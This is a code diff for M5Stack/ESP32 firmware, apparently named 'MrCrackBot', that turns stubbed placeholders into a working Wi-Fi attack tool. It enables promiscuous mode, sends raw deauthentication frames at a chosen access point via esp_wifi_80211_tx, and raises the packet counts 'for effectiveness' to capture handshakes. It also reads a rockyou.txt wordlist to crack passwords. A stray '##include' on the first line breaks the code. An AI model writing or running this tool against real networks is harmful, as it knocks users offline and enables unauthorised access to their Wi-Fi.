@@ -1,12 +1,11 @@
-#include <M5Stack.h>
-#include <WiFi101_Generic.h>
-#include <SdFat.h>
+##include <M5Stack.h>
+#include <WiFi.h>
+#include <SD.h>
 #include <ArduinoJson.h>
+#include <WiFiManagerTZ.h>
 
 #define ROCKYOU_PATH "/rockyou.txt"
-
-SdFat SD;
-File file;
+#define SETTINGS_PATH "/settings.json"
 
 struct NetworkInfo {
   String ssid;
@@ -25,6 +24,8 @@ uint8_t deauthPacket[26] = {
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 };
 
+WiFiManagerTZ wifiManager;
+
 void crackNetworkPassword();
 void deauthNetwork();
 void handleHandshakes();
@@ -36,6 +37,7 @@ void loadNetworksFromSD();
 void saveNetworksToSD();
 void setupFirmware();
 void displayMenu();
+void displaySettingsMenu();
 void scanNetworks();
 void selectNetwork();
 void showNetworkInfo();
@@ -43,6 +45,11 @@ void pwnNetwork();
 void enterDeepSleep();
 void setPromiscuousMode(bool enable);
 void sendDeauthPackets(int count);
+
+// Callback for received packets in promiscuous mode
+void promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
+  // Handle received packets here if needed
+}
 
 void crackNetworkPassword() {
   if (!selectedNetwork.ssid.isEmpty()) {
@@ -60,7 +67,7 @@ void deauthNetwork() {
   if (!selectedNetwork.ssid.isEmpty()) {
     setPromiscuousMode(true);
     fillDeauthPacket(selectedNetwork.bssid);
-    sendDeauthPackets(10);
+    sendDeauthPackets(50); // Increased count for effectiveness
     setPromiscuousMode(false);
   } else {
     M5.Lcd.clear();
@@ -80,16 +87,9 @@ void handleHandshakes() {
   setPromiscuousMode(true);
   fillDeauthPacket(selectedNetwork.bssid);
 
-  File handshakeLog = SD.open("/handshake.log", FILE_WRITE);
-  if (handshakeLog) {
-    for (int i = 0; i < 10; ++i) {
-      // This line should send the deauth packet using WiFi101_Generic if raw packet sending is supported
-      // WiFi.sendPacket((uint8_t *)deauthPacket, sizeof(deauthPacket)); // Example function, may not exist
-      delay(50);
-    }
-    handshakeLog.close();
-  } else {
-    Serial.println("Failed to open handshake.log.");
+  for (int i = 0; i < 50; ++i) { // Increased count for better chance of capture
+    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    delay(50);
   }
 
   setPromiscuousMode(false);
@@ -124,6 +124,13 @@ String crackPassword(const String &ssid, const String &bssid) {
       break;
     }
     M5.Lcd.print(".");
+
+    // Check for user interrupt
+    M5.update();
+    if (M5.BtnA.wasPressed() || M5.BtnB.wasPressed() || M5.BtnC.wasPressed()) {
+      M5.Lcd.println("User interrupted the process.");
+      break;
+    }
   }
 
   rockyouFile.close();
@@ -244,12 +251,12 @@ void setupFirmware() {
   // Set Wi-Fi pins for M5Stack
   WiFi.setPins(8, 7, 4, 2);
 
-  // Start Wi-Fi in AP mode for potential configuration
-  WiFi.beginAP("MrCrackBot", "password123");
+  // Use WiFiManagerTZ to manage WiFi connections
+  wifiManager.autoConnect("AutoConnectAP");
 
-    // Display IP address for AP mode
+    // Display IP address
   IPAddress myIP = WiFi.localIP();
-  M5.Lcd.printf("AP IP address: %s\n", myIP.toString().c_str());
+  M5.Lcd.printf("IP address: %s\n", myIP.toString().c_str());
 
   // Initialize SD card
   if (!SD.begin()) {
@@ -274,9 +281,6 @@ void setup() {
   M5.begin();
   Serial.begin(115200);
   
-  // Initialize WiFi
-  WiFi.init(&Serial);
-  
   setupFirmware();
 }
 
@@ -299,6 +303,8 @@ void loop() {
 
   if (M5.BtnA.pressedFor(5000)) {
     enterDeepSleep();
+  } else if (M5.BtnA.pressedFor(2000) && M5.BtnB.pressedFor(2000) && M5.BtnC.pressedFor(2000)) {
+    displaySettingsMenu();
   }
 }
 
@@ -314,6 +320,19 @@ void displayMenu() {
   M5.Lcd.println("Hold A: Pwn Network");
   M5.Lcd.println("Hold B: Crack Password");
   M5.Lcd.println("Hold C: Deauth Network");
+  M5.Lcd.println("Settings: Hold all three buttons");
+}
+
+void displaySettingsMenu() {
+  M5.Lcd.clear();
+  M5.Lcd.setCursor(0, 0);
+  M5.Lcd.setTextSize(3);
+  M5.Lcd.println("Settings Menu");
+  M5.Lcd.setTextSize(2);
+  // Add settings options here
+  M5.Lcd.println("A: Option 1");
+  M5.Lcd.println("B: Option 2");
+  M5.Lcd.println("C: Option 3");
 }
 
 void scanNetworks() {
@@ -409,21 +428,19 @@ void enterDeepSleep() {
 }
 
 void setPromiscuousMode(bool enable) {
-  // Implementation depends on the hardware and library support
-  // This may need custom implementation if supported
-  // For example: WiFi.promiscuousMode(enable);
+  if (enable) {
+    // Enable promiscuous mode
+    esp_wifi_set_promiscuous_rx_cb(promiscuous_rx_cb);
+    esp_wifi_set_promiscuous(true);
+  } else {
+    // Disable promiscuous mode
+    esp_wifi_set_promiscuous(false);
+  }
 }
 
 void sendDeauthPackets(int count) {
-  File deauthLog = SD.open("/deauth.log", FILE_WRITE);
-  if (deauthLog) {
-    for (int i = 0; i < count; ++i) {
-      // This line should send the deauth packet using WiFi101_Generic if raw packet sending is supported
-      // WiFi.sendPacket((uint8_t *)deauthPacket, sizeof(deauthPacket)); // Example function, may not exist
-      delay(10);
-    }
-    deauthLog.close();
-  } else {
-    Serial.println("Failed to open deauth.log.");
+  for (int i = 0; i < count; ++i) {
+    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    delay(10);
   }
 }
